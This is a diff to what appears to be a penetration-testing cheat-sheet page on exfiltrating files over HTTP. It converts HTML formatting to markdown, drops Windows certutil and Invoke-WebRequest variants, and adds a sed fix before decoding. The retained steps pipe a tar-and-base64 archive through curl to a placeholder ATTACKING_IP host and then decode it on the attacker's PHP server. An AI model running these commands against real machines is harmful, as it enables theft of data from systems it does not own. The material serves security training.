@@ -50,32 +50,26 @@ if (isset($_POST['file'])) {
 
 Second, start the PHP web-server in the same directory
 
-<pre class="language-bash"><code class="lang-bash"># Start server on port 80
-<strong>v4resk㉿kali$ php -S 0.0.0.0:80
-</strong></code></pre>
+```bash
+# Start server on port 80
+v4resk㉿kali$ php -S 0.0.0.0:80
+```
 
-On the victime computer, you can now send data through POST request. It will be saved at `/tmp/http.bs64`
+On the victim computer, you can now send data through POST request. It will be saved at `/tmp/http.bs64`
 
 ```bash
 # Linux
 # Compress folder, base64, and send
 user@victime$ curl --data "file=$(tar zcf - Bashed | base64)" http://ATTACKING_IP/
-
-# Windows
-# Base64 file, and send 
-user$ certutil -encode fileToSend b64FileToSend
-user$ curl -X POST -H "Content-Type: application/octet-stream" --data-binary "@b64FileToSend" https://ATTACKING_IP/
-user$ Invoke-WebRequest -Method POST -ContentType "application/octet-stream" -InFile "b64FileToSend" -Uri https://ATTACKING_IP/d
 ```
 
 On attacking machine, we can decode now decode it:
 
-<pre class="language-bash"><code class="lang-bash"># Decode compressed folders
-<strong>v4resk㉿kali$ cat /tmp/http.bs64 | base64 -d | tar xvfz -
-</strong><strong>
-</strong><strong># Decode windows file 
-</strong>v4resk㉿kali$ cat /tmp/http.bs64 | base64 -d
-</code></pre>
+```bash
+# Decode compressed folders
+v4resk㉿kali$ sed -i 's/ /+/g' /tmp/http.bs64
+v4resk㉿kali$ cat /tmp/http.bs64 | base64 -d | tar xvfz -
+```
 {% endtab %}
 {% endtabs %}
 
